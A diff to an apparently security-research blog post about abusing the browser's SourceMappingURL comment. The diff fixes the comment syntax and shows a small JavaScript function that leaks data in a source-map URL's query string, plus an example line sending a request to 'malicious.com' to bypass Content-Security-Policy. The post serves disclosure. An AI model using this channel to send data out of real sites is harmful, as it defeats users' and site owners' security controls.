@@ -13,7 +13,7 @@ Not too long ago, I’ve learned about [SourceMappingURL](https://developer.mozi
 All you need to do is to locate the following comment at the bottom of your minified/uglified Javascript resource:
 
 ```javascript
-// SourceMappingURL=https://www.my-website.com/map.json
+//# SourceMappingURL=https://www.my-website.com/map.json
 ```
 
 and the browser will fetch the map from your servers (which you’ll also need to implement yourself in order for the feature to actually work), and will make sure to do the mapping and the representation of it for you (if this doesn’t make a lot of sense to you - go read more about [SourceMappingURL](https://developer.mozilla.org/en-US/docs/Tools/Debugger/How_to/Use_a_source_map)!).
@@ -43,7 +43,7 @@ The following works:
 ```javascript
 function  smap(url, data)  {
 	const script = document.createElement('script');
-	script.textContent =  `// SourceMappingURL=${url}?data=${JSON.stringify(data)}`;
+	script.textContent =  `//# SourceMappingURL=${url}?data=${JSON.stringify(data)}`;
 	document.head.appendChild(script);
 	script.remove();  // that's right! the script doesn't even have to stay in DOM for this feature to work! how cool is that?!
 }
@@ -59,7 +59,7 @@ So far so good. But as I always do when I learn of a new trick to send requests 
 
 Wow! That one was a cool discovery in my research! So if I go on https://example.com for example and it responds with Content-Security-Policy: default-src https://example.com as one of its headers (which means requests under https://example.com are only allowed to be made to https://example.com), I would be able to bypass that rule completely by using the SourceMappingURL feature by doing:
 
-`// SourceMappingURL=http://malicious.com?THIS_REQUEST_WILL_MAKE_IT_TO_THE_SERVER`.
+`//# SourceMappingURL=http://malicious.com?THIS_REQUEST_WILL_MAKE_IT_TO_THE_SERVER`.
 
 This is pretty cool considering how difficult and almost impossible it is to bypass CSP rules these days.
 
